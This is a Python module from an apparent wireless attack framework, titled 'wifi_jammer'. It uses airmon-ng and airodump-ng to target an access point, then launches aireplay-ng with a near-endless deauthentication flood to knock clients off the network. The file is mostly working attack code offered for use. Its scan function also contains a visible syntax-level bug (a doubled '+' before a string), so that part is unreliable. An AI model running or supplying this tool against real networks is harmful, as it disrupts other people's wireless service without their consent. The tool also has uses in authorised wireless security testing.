#        Copyright (C) 2015 Noa-Emil Nissinen (4shadoww)

from collections import OrderedDict
import subprocess
import os
from time import sleep
from core import colors
from core import getpath

conf = {
	"name": "wifi_jammer",
	"version": "1.0",
	"shortdesc": "jam wifi",
	"author": "4shadoww",
	"github": "4shadoww",
	"email": "4shadoww0@gmail.com",
	"initdate": "24.2.2016",
	"needroot": 1
}

# List of the variables
variables = OrderedDict((
	('interface', 'wlan0'),
	('bssid', 'none'),
	('essid', 'none'),
	('mon', 'mon0'),
	('channel', '11'),
))

vdesc = [
	'wireless interface name',
	'target BSSID address',
	'target ESSID name',
	'monitor',
	'target channel number',
]

# Help for the custom commands (remove if you will not use custom commands)
mhelp = OrderedDict((
	('scan', 'scan for target'),
	('stop', 'terminate process'),
))

# Additional help notes
help_notes = colors.red+"this module will not work without root permission!\n this module will not work without xterm, aircrack-ng!"+colors.end

# Used with custom commands (remove this if are not using custom commands)
customcommands = (
	'scan',
	'stop'
)

# Simple changelog
changelog = "Version 1.0:\n\trelease"


def run():
	print (colors.green + "[*]Attack Has Been Started on : " + variables['essid'])
	print ("use command 'stop' to end attack" + colors.end)
	xterm_3 = "xterm -e "+ "airodump-ng" +" -c " + variables['channel'] + " --bssid " + variables['bssid'] + " " + variables['mon'] + " &"
	os.system(xterm_3)
	sleep(4)
	xterm_4 = "xterm -e "+"aireplay-ng"+" --deauth 9999999999999 -o 1 -a " + variables['bssid'] + " -e " + variables['essid'] + " " + variables['mon'] + " &"
	os.system(xterm_4)
	sleep(1)
	os.system(xterm_4)
	sleep(3)
	print(colors.green+"attack started"+colors.end)

def stop(args):
	subprocess.Popen("killall xterm", stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True).wait()
	subprocess.Popen("killall aireplay", stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True).wait()
	xterm_5 =  "airmon-ng"+" stop " + variables['interface']
	os.system(xterm_5)
	print(colors.green+"process terminated..."+colors.end)

def scan(args):
	xterm_1 = "airmon-ng"+" start " + variables['interface']
	xterm_2 = "xterm -e "+"airmon-ng " + + variables['mon'] + " &"
	subprocess.Popen(xterm_1, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True).wait()
	sleep(3)
	os.system(xterm_2)
	sleep(4)
	print(colors.green+"scan started"+colors.end)